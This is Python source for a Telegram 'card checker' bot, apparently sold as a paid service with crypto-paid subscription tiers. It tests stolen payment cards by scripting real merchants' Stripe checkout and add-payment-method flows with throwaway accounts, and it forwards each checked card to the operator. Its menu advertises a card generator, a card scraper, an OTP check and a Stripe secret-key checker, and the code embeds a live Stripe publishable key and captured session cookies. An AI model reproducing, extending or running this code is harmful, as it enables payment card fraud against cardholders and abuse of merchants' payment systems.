	    'payment_method[card][exp_year]': yy,
	    'payment_method[card][funding]': 'debit',
	    'payment_method[card][generated_from]': '',
	    'payment_method[card][last4]': '2678',
	    'payment_method[card][networks][available][]': 'visa',
	    'payment_method[card][networks][preferred]': '',
	    'payment_method[card][three_d_secure_usage][supported]': 'true',
	    'payment_method[card][wallet]': '',
	    'payment_method[created]': tim,
	    'payment_method[customer]': '',
	    'payment_method[livemode]': 'true',
	    'payment_method[type]': 'card',
	}
	
	response = requests.post('https://easydigitaldownloads.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	intent_id=response.json()['data']['intent_id']
	client_secret=(response.json()['data']['client_secret'])	
	data = f'use_stripe_sdk=true&mandate_data[customer_acceptance][type]=online&mandate_data[customer_acceptance][online][infer_from_client]=true&return_url=https%3A%2F%2Feasydigitaldownloads.com%2Fcheckout%2Fpurchase-confirmation%2F&payment_method={id}&key=pk_live_516JR4KHeKl7xu5z9nKEF3VK0jG4EB5LkIp2eq4rWxoBkXpk8HQEdbY5DuWgmvkIdxY1Lds0gw4PwXk3FCBhyU3BI0026lUnZne&client_secret={client_secret}'
	response = requests.post(
		    f'https://api.stripe.com/v1/payment_intents/{intent_id}/confirm',
		    headers=headers,
		    data=data,
		)
	msg=(response.text)
	try:
		return (response.json()['error']['message'])
	except:
		if 'success' in msg or 'Success' in msg:
			return 'success'
		else:
			return '3d_secure_2'
def reg(cc):
	try:
		regex = r'\d+'
		matches = re.findall(regex, cc)
		n = matches[0][:16]
		if n.startswith("3"):
			n = matches[0][:15]
		mm = matches[1]
		yy = matches[2]
		cvc = matches[3]
		if len(mm) == 1:
			mm = '0'+mm
		if len(yy)==2:
			yy='20'+yy
		if len(n)==16 or len(mm)==2 or len(yy) ==4 or cvc==3 or cvc==4:
			cc = f"{n}|{mm}|{yy}|{cvc}"
			return cc
	except:
		pass
@bot.message_handler(commands=["pu"])
def pk(message):
	id=message.from_user.id
	tm=''
	if admin == (id):
		pass
	else:
		return
	ax = 0
	msg=message.text.split('/pu')[1]
	try:
		with open('data.json') as f:
			data = json.load(f)
		bot.reply_to(message, 'Broadcasting to bot users and groups...⏳')
		for key, value in data.items():
			if key in tm:
				continue
			try:
				tm+=key+'\n'
				bot.send_message(key, msg)
				time.sleep(0.5)
				ax+=1
			except Exception as e:
				print('ERROR : ',e)
		bot.reply_to(message, f'The broadcast has ended and the message has been successfully sent to {ax} user ✅')
	except Exception as e:
		bot.reply_to(message, 'Failed, something is wrong...❌')
		print('ERROR 2: ',e)
@bot.message_handler(commands=["start","help"])
def start(message):
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		id=message.from_user.id
		try:BL=(json_data[str(id)])
		except:
			BL='Free'
			file_path = 'data.json'
			file = open('data.json', 'r+')
			json_data = json.load(file)
			new_data = {
				id : {
	  "plan": "Free",
	  "timer": "none",
	  "funds": 0,
	  "order": ""
				}
			}
			json_data.update(new_data);file.seek(0);json.dump(json_data, file, indent=4);file.truncate()
		keyboard = types.InlineKeyboardMarkup()
		username = message.from_user.first_name
		button1 = types.InlineKeyboardButton(text='𝐌𝐞𝐧𝐮', callback_data='menu')
		button2 = types.InlineKeyboardButton(text="𝐔𝐬𝐞 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐅𝐫𝐞𝐞", url=f"https://t.me/{group}")
		add_bot_button = types.InlineKeyboardButton(text='𝐀𝐝𝐝 𝐁𝐨𝐭 𝐭𝐨 𝐌𝐲 𝐆𝐫𝐨𝐮𝐩', url=f'https://t.me/{botuser}?startgroup')
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
		keyboard.row(button1)
		keyboard.row(button2)
		keyboard.row(add_bot_button)
		msg = bot.reply_to(message, f'''<b>🤖 Bot Status: Active ✅

Join <a href="t.me/CCMO3">Here</a> to Get Updates And Keys For The Bot

If You Want to Run a Bot In Your Group, Make Sure The Bot is The Admin 🎁</b>''', reply_markup=keyboard)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def redeem(message):
		try:
			id=message.from_user.id
			re=message.text.split(' ')[1]
			file = open('data.json', 'r+')
			json_data = json.load(file)
			try:
				user=json_data[str(id)]
			except:
				new_data = {
				id : {
	  "plan": "Free",
	  "timer": "none",
	  "funds": 0,
	  "order": ""
				}
			}
	
				json_data.update(new_data);file.seek(0);json.dump(json_data, file, indent=4);file.truncate()
			with open('data.json', 'r+') as file:
				json_data = json.load(file)
			timer=(json_data[re]['timer'])
			credits=(json_data[re]['credits'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['funds'] = credits
			json_data[f"{message.from_user.id}"]['plan'] = 'Premium'
			json_data[f"{message.from_user.id}"]['timer'] = timer
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r+') as json_file:
				data = json.load(json_file)
			with open('data.json', 'r+') as file:
				json_data = json.load(file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, indent=4)
			keyboard = types.InlineKeyboardMarkup()
			free = types.InlineKeyboardButton(text='𝐇𝐨𝐰 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐞 𝐁𝐨𝐭', callback_data='menu')
			keyboard.row(free)
			if 'Bronze' in typ:
				du='One Month'
				plan='Bronze'
			if 'Silver' in typ:
				du='3 Months'
				plan='Silver'
			if 'Gold' in typ:
				du='One Year'
				plan='Gold'
			if 'Diamond' in typ:
				du='Forever'
				plan='Diamond'
			if 'Diamond' in typ:
				du='Forever'
				plan='Diamond'
			if 'Test' in typ:
				du='30 Min'
				plan='Test'
			msg=f'''<b>{typ} Subscription Active ✅

Credits > {credits}
Type Plan > {typ}
Duration > {du}

Welcome To The Distinguished Members Community </b>'''
			bot.reply_to(message,msg,reply_markup=keyboard)
			ms=f'''New Recovery Process 🏴‍☠️

Key > <code>{re}</code>
ID > {id}
Name > {message.from_user.first_name}
Username > @{message.from_user.username}
Device Language > {message.from_user.language_code}
Bot: @{botuser}'''
			bot.send_message(admin,text=ms)
			bot.send_message(owner,text=ms)
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Wrong Key or Previously Redeemed ❌</b>',parse_mode="HTML")
@bot.message_handler(commands=["code"])
def create_code(message):
		id=message.from_user.id
		if not id == admin:
			return
		try:
			if '1m' in message.text:
				h=720
				du='One Month'
				hu=250
				plan='Bronze'
			if '3m' in message.text:
				hu=350
				h=2160
				du='3 Months'
				plan='Silver'
			if '1y' in message.text:
				hu=750
				h=8640
				du='One Year'
				plan='Gold'
			if 'forever' in message.text:
				hu=1500
				h=80000
				du='Forever'
				plan='Diamond'
			if 'test' in message.text:
				hu=15
				h=0.5
				du='30 Min'
				plan='Test'
			with open('data.json', 'r+') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas =f'{namebot}-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			file = open('data.json', 'r+')
			json_data = json.load(file)
			new_data = {
				pas : {
	  "plan": plan,
	  "credits": hu,
	  "timer": ig
			}
			}
			json_data.update(new_data);file.seek(0);json.dump(json_data, file, indent=4);file.truncate()
			msg=f'''<b>New Key Created  💎
			
Key > <code>{pas}</code>	
Credits > {hu}
Type Plan > {plan}
Duration > {du}

Use the command /redeem + Key ,To Redeem The Key</b>'''
			
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
@bot.message_handler(commands=["id"])
def infoi(message):
	with open('data.json', 'r+') as file:
		json_data = json.load(file)
	id=message.from_user.id
	keyboard = types.InlineKeyboardMarkup()
	up = types.InlineKeyboardButton(text='𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐔𝐩𝐠𝐫𝐚𝐝𝐞', callback_data='Pre')
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	keyboard.row(up)
	keyboard.row(back)
	plan=json_data[str(id)]['plan']
	fun=json_data[str(id)]['funds']
	username = message.from_user.first_name
	bot.reply_to(message,
					  text=f'''<b>Account Info 👤
━━━━━━━━━━━━━━━━━
ID: <code>{id}</code>
Name: <a href="https://t.me/{message.from_user.username}">{username}</a>
Username: @{message.from_user.username}
Your Plan: {plan}
Credits: {fun}
━━━━━━━━━━━━━━━━━
<a href="https://t.me/{userdeve}">Do You Need Help?</a></b>''',
					  reply_markup=keyboard,parse_mode="HTML")
@bot.message_handler(commands=["on","of"])
def conrol(message):
	try:
		if not message.from_user.id == admin:
			return
		if 'of' in message.text:
			id=message.text.replace('/of ', '')
			with open('data.json', 'r+') as file:
				json_data = json.load(file)
				json_data[f'{id}']['status'] = 'ofline'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
		if 'on' in message.text:
			id=message.text.replace('/on ', '')
			with open('data.json', 'r+') as file:
				json_data = json.load(file)
				json_data[f'{id}']['status'] = 'Online'
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
		
		bot.reply_to(message, 'Successful')
	except:
		bot.reply_to(message,'ERROR')
@bot.callback_query_handler(func=lambda call: call.data == 'Pre')
def pre(call):
	keyboard = types.InlineKeyboardMarkup()
	de = types.InlineKeyboardButton(text='𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲', callback_data='pur')
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	keyboard.row(de)
	keyboard.row(back)
	bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id,text='''Choose One of The Premium Subscriptions 💎

● Unlimited Checking 🤑
● Without anti-spam 
● Continuous Support To Help You With Any Problem You Face 
● Unlimited Access To All Gates And Tools, Except For Some Gates That Require Credits 

What are Credits?: Some gateways need credits to use. If you run out of credits, you can still use the gateways that don't require them. ℹ️

Bronze layer:
● Credits: 250 Points
● Duration: 1 Month
● Price: 10 USD

Silver layer:
● Credits: 350 Points
● Duration: 3 Month
● Price: 30 USD

Gold layer:
● Credits: 750 Points
● Duration: 12 Month
● Price: 80 USD

Diamond layer:
● Credits: 1500 Points
● Duration: Forever
● Price: 130 USD

If You Need More Credits 💎:
⚠️ For Active Premium Only ⚠️
350 Credits: 5 USD
700 Credits: 10 USD
1500 Credits: 20 USD
2400 Credits: 30 USD

Subscribe Now To The Premium Plans And Enjoy A Smooth And Wonderful Experience And Unleash Our Distinguished Services 🔥💪''', reply_markup=keyboard)
@bot.callback_query_handler(func=lambda call: call.data == 'pur')
def pur(call):
	keyboard = types.InlineKeyboardMarkup()
	de = types.InlineKeyboardButton(text='Confirm Payment', url=f"https://t.me/{userdeve}")
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='Pre')
	keyboard.row(de)
	keyboard.row(back)
	bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id,text=f'''
This Is The Payment Information. Pay The Required Amount For The Chosen Plan 

Binance USDT (ID) = <code>868981219</code>
USDT (Trc20) = <code>{trc}</code>
LTC (Litecoin) = <code>{lit}</code>
TRX (Trc20) = <code>{trc}</code>

After Payment, Click On The “Confirm Payment” Button To Email Us, Send The Payment Result, And Activate Your Premium Subscription 

● Orders Are Final Without Discussion. Once Paid, The Amount Cannot Be Refunded, So Please Double-Check The Amount Paid And The Chosen Plan ⚠️

● Any Deposit That Does Not Match The Exact Price Of The Chosen Plan Will Be Forfeited. It Is Crucial To Send The Correct Amount To Avoid Any Loss Of Funds. ⚠️

Enjoy Your Premium Experience! 🎉''', reply_markup=keyboard)
@bot.callback_query_handler(func=lambda call: call.data == 'acc')
def acc(call):
	with open('data.json', 'r+') as file:
		json_data = json.load(file)
	id=call.from_user.id
	keyboard = types.InlineKeyboardMarkup()
	up = types.InlineKeyboardButton(text='𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐔𝐩𝐠𝐫𝐚𝐝𝐞', callback_data='Pre')
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	keyboard.row(up)
	keyboard.row(back)
	plan=json_data[str(id)]['plan']
	fun=json_data[str(id)]['funds']
	username = call.from_user.first_name
	bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''<b>Account Info 👤
━━━━━━━━━━━━━━━━━
ID: <code>{id}</code>
Name: <a href="t.me/{call.from_user.username}">{username}</a>
Username: @{call.from_user.username}
Your Plan: {plan}
Credits: {fun}
━━━━━━━━━━━━━━━━━
<a href="https://t.me/{userdeve}">Do You Need Help?</a></b>''',
					  reply_markup=keyboard,parse_mode="HTML")
@bot.callback_query_handler(func=lambda call: call.data == 'menu')
def menu(call):
	gates_on=0
	gates_of=0
	gates_total=0
	gates_fr=0
	gates_pro=0
	with open('data.json') as f:
		data = json.load(f)
	for key, value in data.items():
			try:
				h=value['status']
				b=value['typ']
				gates_total+=1
				if h == 'Online':
					gates_on+=1
				else:
					gates_of+=1
				if b == 'Premium':
					gates_pro+=1
				else:
					gates_fr+=1
			except:
				pass
	keyboard = types.InlineKeyboardMarkup()
	free = types.InlineKeyboardButton(text='𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 𝐀𝐮𝐭𝐡', callback_data='Auth')
	pro = types.InlineKeyboardButton(text='𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 𝐂𝐡𝐚𝐫𝐠𝐞', callback_data='charge')
	tool = types.InlineKeyboardButton(text='𝐓𝐨𝐨𝐥𝐬', callback_data='tool')
	gt = types.InlineKeyboardButton(text='𝐆𝐞𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦', callback_data='Pre')
	acc=types.InlineKeyboardButton(text='𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭', callback_data='acc')
	keyboard.row(free,pro)
	keyboard.row(gt)
	keyboard.row(tool)
	keyboard.row(acc)
	bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''<b>Total Gates ➜ {gates_total} 📃
Total Tools ➜ 6 🧾
Premium Gates ➜ {gates_pro} 💎
Free Gates ➜ {gates_fr} 💸
Gates Online ➜ {gates_on} ✅
Gates ofline ➜ {gates_of} ❌
━━━━━━━━━━━━━━━━━</b>''',
					  reply_markup=keyboard,parse_mode="HTML")
@bot.callback_query_handler(func=lambda call: call.data == 'Auth')
def auth(call):
	with open('data.json', 'r+') as file:
		json_data = json.load(file)
	id=call.from_user.id
	
	try:BL=(json_data[str(id)]['plan'])
	except:
		BL='unregistered'
	keyboard = types.InlineKeyboardMarkup()
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	button1 = types.InlineKeyboardButton(text='𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭', callback_data='acc')
	keyboard.row(button1)
	keyboard.row(back)
	msgs=''
	with open('data.json') as f:
			data = json.load(f)
	for key, value in data.items():
		try:
			status=value['status']
			if status == 'Online':
				status='Online ✅'
			else:
				status='ofline ❌'
			typ=value['typ']
			name=value['name']
			cred=0
			if 'Auth' in name:
					msg=f'''[•] Name: {name}
[•] Usage: {key}
[•] Status: {status}
[•] Credits: {cred}
[•] Type: {typ}\n━━━━━━━━━━━━━━━━━\n'''
					msgs+=msg
		except:
			continue
	bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'''<b>
{msgs}</b>
''',reply_markup=keyboard,parse_mode="HTML")
@bot.callback_query_handler(func=lambda call: call.data == 'tool')
def tools(call):
	keyboard = types.InlineKeyboardMarkup()
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	keyboard.row(back)
	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='''<b>BIN Info:
Retrieve information for a specific Bank Identification Number.
Command: /bin {6-digit bin}
Example: <code>/bin 412236</code>
━━━━━━━━━━━━━━━━━
CC Generator:
Generate a credit card number for testing purposes.
Command: /gen CARD_NUMBER | EXP_DATE | CVV
Example: <code>/gen 412236xxxx|xx|2025|xxx</code>
━━━━━━━━━━━━━━━━━
Redeem Key: 
/redeem key
━━━━━━━━━━━━━━━━━
CC Scrapper:
Usage: /scr username amount bin (optional) [Max 10000000 Scrapes at a Time]
━━━━━━━━━━━━━━━━━
Check OTP?:
Usage: /vbv CARD_NUMBER | EXP_DATE | CVV</b>
━━━━━━━━━━━━━━━━━
Check API Key Stripe: 
/sk key
━━━━━━━━━━━━━━━━━''',reply_markup=keyboard,parse_mode="HTML")
@bot.callback_query_handler(func=lambda call: call.data == 'charge')
def charge(call):
	with open('data.json', 'r+') as file:
		json_data = json.load(file)
	id=call.from_user.id
	keyboard = types.InlineKeyboardMarkup()
	back = types.InlineKeyboardButton(text='𝐁𝐚𝐜𝐤', callback_data='menu')
	button1 = types.InlineKeyboardButton(text='𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭', callback_data='acc')
	keyboard.row(button1)
	keyboard.row(back)
	msgs=''
	with open('data.json') as f:
			data = json.load(f)
	for key, value in data.items():
		try:
			status=value['status']
			if status == 'Online':
				status='Online ✅'
			else:
				status='ofline ❌'
			typ=value['typ']
			name=value['name']
			cred=1
			if 'CVV' in name or 'Charge' in name or 'CCN' in name or '$' in name:
				if not 'Auth' in name:
					msg=f'''[•] Name: {name}
[•] Usage: {key}
[•] Status: {status}
[•] Credits: {cred}
[•] Type: {typ}\n━━━━━━━━━━━━━━━━━\n'''
					msgs+=msg
		except:
			continue
	bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f'''<b>
{msgs}</b>
''',reply_markup=keyboard,parse_mode="HTML")
#نبدأ نضيف اوامر الفحص 
def cu(cmd,id,bot,message):
	try:
		file = open('data.json', 'r+')
		json_data = json.load(file)
		chk=json_data[str(cmd)]['typ']
		gate=json_data[str(cmd)]['name']
		de=json_data[str(cmd)]['def']
		status=json_data[str(cmd)]['status']
	except Exception as e:
		
		file = open('data.json', 'r+')
		json_data = json.load(file)
		chk=json_data[str(cmd)]['typ']
		gate=json_data[str(cmd)]['name']
		de=json_data[str(cmd)]['def']
		status=json_data[str(cmd)]['status']
	file = open('data.json', 'r+')
	json_data = json.load(file)
	try:
		plan=json_data[str(id)]['plan']
		fun=json_data[str(id)]['funds']
	except:
		new_data = {
			id : {
  "plan": "Free",
  "timer": "none",
  "funds": 0,
  "order": ""
			}
		}
		json_data.update(new_data);file.seek(0);json.dump(json_data, file, indent=4);file.truncate()
		plan='Free'
		fun=0
	if 'CVV' in gate or 'Charge' in gate or 'CCN' in gate or '$' in gate:
		if 'Stripe CVV 5$' in gate:
			pass
		else:
			if fun <= 0:
				bot.reply_to(message,'<b>You Do Not Have Any Credit Points. Buy More Points to Use This Gate</b>')
				return
	if chk=='Premium':
		date_str=json_data[str(id)]['timer']
		if date_str=='none':
			keyboard = types.InlineKeyboardMarkup()
			button1 = types.InlineKeyboardButton(text="Upgrade to The Premium Plan", callback_data='Pre')
			button2 = types.InlineKeyboardButton(text="𝐔𝐬𝐞 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐅𝐫𝐞𝐞", url=f"https://t.me/{group}")
			keyboard.row(button1)
			keyboard.row(button2)
			bot.reply_to(message, '<b>Sorry, You Cannot Use This Command Because This Command is For Premium Users Only And Your Current Plan is Free. to Upgrade to The Premium Plan, Click on The First Button Below to Know The Details.</b>',reply_markup=keyboard)
			return
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
		current_time = datetime.now()
		required_duration = timedelta(hours=0)
		if current_time - provided_time > required_duration:
			keyboard = types.InlineKeyboardMarkup()
			button1 = types.InlineKeyboardButton(text="Upgrade to The Premium Plan", callback_data='Pre')
			button2 = types.InlineKeyboardButton(text="𝐔𝐬𝐞 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐅𝐫𝐞𝐞", url=f"https://t.me/{group}")
			keyboard.row(button1)
			keyboard.row(button2)
			bot.reply_to(message, '<b>it Appears That Your Subscription Has Expired. to Purchase a New Subscription, Click on The First Button Below to Know The Subscription Details .</b>',reply_markup=keyboard)
			json_data[str(id)]['timer'] = 'none'
			json_data[str(id)]['plan'] = 'Free'
			json_data[str(id)]['funds'] = 0
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			return
	if status=='ofline':
		bot.reply_to(message,'<b>The Gate Is Under Maintenance 🔧⚙️</b>',parse_mode="HTML")
		return
	cmd=cmd.split('/')[1]
	cc=message.text.split(cmd)[1]
	
	cc=str(reg(cc))
	if cc == 'None':
		try:
			cc = message.reply_to_message.text
			cc=str(reg(cc))
			if cc == 'None':
				bot.reply_to(message, '''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		except:
			bot.reply_to(message, '''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
			return
	if not '3' == cc[:1]:
		if luhn_algorithm(cc.split('|')[0]):
			pass
		else:
			bot.reply_to(message,'<b>Your Card Number is Not Valid. Try to Input a Valid Card Number ❌</b>')
			return
	mm = cc.split("|")[1]
	yy = cc.split("|")[2]
	current_date = datetime.now()
	try:
		input_date = datetime(int(yy), int(mm), 1)
	except:
		bot.reply_to(message,'<b>Your Card Date Is Wrong ❌</b>')
		return
	if input_date > current_date:
	    pass
	else:
	    bot.reply_to(message,'<b>Your Card Date Is Wrong ❌</b>')
	    return 
	allowed, time_until_next_hour = check_command_limit(id)
	sc=30
	if 'VIP' == plan or 'premium' == plan or 'Premium' == plan:
		sc=8
	allowed, time_until_next_hour = check_command_limit(id)
	if not allowed:
		bot.reply_to(message, f"<b>Only 30 𝘤𝘢𝘳𝘥𝘴 can be checked per hour for non-subscribers. You can check again in {time_until_next_hour}m.</b>",parse_mode="HTML")
		return
	current_time = datetime.now()
	if command_usage[id]['last_time'] is not None:
		time_diff = (current_time - command_usage[id]['last_time']).seconds
		if time_diff < sc:
			bot.reply_to(message, f"<b>Try again after {sc-time_diff} seconds.</b>",parse_mode="HTML")
			return
	ko = (bot.reply_to(message, "<b>Checking Your Card...⌛</b>",parse_mode="HTML").message_id)
	start_time = time.time()
	command_usage[id]['last_time'] = datetime.now()
	if plan=='Free':
		command_usage[id]['count'] += 1
	start_time = time.time()
	try:
		last = globals()[de](cc)
		bot.send_message(admin,f'{cc} {last} {de}')		
	except Exception as e:
		line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
		error_type = type(e).__name__
		er=f'An error occurred [ {cmd} ] type error [ {error_type} ] in line [ {line_number} ] [ {cc} ] '
		bot.send_message(admin,er)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='<b>An Error Occurred, Try Again</b>')
		return
	end_time = time.time()
	execution_time = end_time - start_time
	if 'Approved' in last or 'Invalid postal code' in last or 'Your card is saved' in last:
		status='𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅'
	elif 'risk' in last or 'RISK' in last:
		status='𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
		last='RISK: Retry this BIN later or Then Change the BIN'
	elif 'CHARGED' in last or 'success' in last or 'Success' in last or 'Your payment has already been processed' in last or 'succeeded' in last or 'success' in last or 'Thank' in last or 'Charged' in last:
		status='𝐂𝐡𝐚𝐫𝐠𝐞 ✅'
	elif 'Funds' in last or 'funds' in last or 'Low balance' in last or 'TRANSACTION_LIMIT' in last:
		status='𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬 ☑️'
	else:
		status='𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌'
	brand, card_type, bank, country, country_flag, statu = info(cc.split('|')[0])
	msg=f'''<b>{status}
		
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐑𝐞𝐬𝐮𝐥𝐭 ➜ {last}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ {gate}
	
𝐁𝐈𝐍 ➜ {cc[:6]} - {card_type} - {brand} 
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} - {country_flag} 
𝐁𝐚𝐧𝐤 ➜ {bank}

𝟯𝐃 𝐋𝐨𝐨𝐤𝐮𝐩 ➜ {vbv(cc)}
𝐓𝐢𝐦𝐞 {"{:.1f}".format(execution_time)} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬</b>'''
	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg,parse_mode="HTML")
	if 'CVV' in gate or 'Charge' in gate or 'CCN' in gate or '$' in gate:
		with open('data.json', 'r+') as file:
			json_data = json.load(file)
			fun = json_data[str(id)]['funds']
			s = int(fun) - 1
			json_data[str(id)]['funds'] = s
			file.seek(0)
			json.dump(json_data, file, indent=4)
			file.truncate()
def luhn_algorithm(card_number):
	digits = [int(digit) for digit in str(card_number)]
	digits.reverse()
	doubled_digits = [digit * 2 if index % 2 == 1 else digit for index, digit in enumerate(digits)]
	doubled_digits = [digit - 9 if digit > 9 else digit for digit in doubled_digits]
	total = sum(doubled_digits)
	return total % 10 == 0
#We need to add a scan function 
def cv(cc):
	import requests
	import string,random
	def gen_email():
	    domains = ["google.com", "live.com", "yahoo.com", "hotmail.org"]
	
	    name_length = 8
	    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
	    domain = random.choice(domains)
	    email = f"{name}@{domain}"
	    return email
	ses=requests.Session()
	headers = {
	    'authority': 'www.workerkit.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'max-age=0',
	    # 'cookie': 'PHPSESSID=af77454001bef418cb6776b53507e063; soundestID=20240824074627-YcesvkOUKkqtQWaYGAFWM0XDtq1KbPsqvtVrecUK3qahqRPmk; omnisendSessionID=pkQiunOMHyPJRU-20240824074627; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-24%2007%3A46%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.workerkit.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-24%2007%3A46%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.workerkit.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gid=GA1.2.1735481473.1724485589; __stripe_mid=dc6189de-a74f-4dd6-9ff2-309029ec317c1e9b75; __stripe_sid=f56b0f31-a815-43cc-ab55-63f1810279268d87f9; omnisend-form-623ee4618597cb849b422a1f-closed-at=2024-08-24T07:46:33.908Z; omnisendContactID=66c98ff417c309a221340fa5; tk_ai=dmtWzCPz4jD44gdOXJ89jilI; tk_qs=; wordpress_test_cookie=WP%20Cookie%20check; _ga_B03N69P7WC=GS1.1.1724485587.1.1.1724486135.56.0.0; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.workerkit.com%2Fmy-account%2Fadd-payment-method%2F; _ga=GA1.2.957135065.1724485588; _gat_gtag_UA_242621767_1=1; page-views=6',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	response = ses.get('https://www.workerkit.com/my-account/add-payment-method/', headers=headers)
	nonce=(response.text.split('name="_wpnonce" value="')[1].split('"')[0])
	params = {
	    'action': 'register',
	}
	
	data = {
	    'email': gen_email(),
	    'email_2': '',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
